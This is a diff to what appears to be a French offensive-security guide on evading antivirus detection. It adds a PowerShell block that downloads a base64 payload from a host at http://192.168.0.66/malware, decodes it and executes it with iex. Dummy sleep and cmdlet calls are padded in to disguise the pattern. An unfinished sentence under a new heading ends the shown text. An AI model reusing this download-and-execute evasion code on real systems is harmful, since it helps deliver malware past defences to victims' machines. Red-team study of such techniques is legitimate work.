@@ -164,7 +164,18 @@ $virus = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64Stri
 iex $virus;
 ```
 
-peut être remplacé par
+peut être remplacé par :
+
+```powershell
+$b64 = $(irm -uri http://192.168.0.66/malware); sleep 0.01;sleep 0.01;Get-Process | Out-Null;
+$virus = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64));sleep 0.01;sleep 0.01;Measure-Object | Out-Null;
+iex $virus;
+```
+
+
+## __Commande de substitution__
+
+On peut essayer de 
 
 
 ## __Scripts__
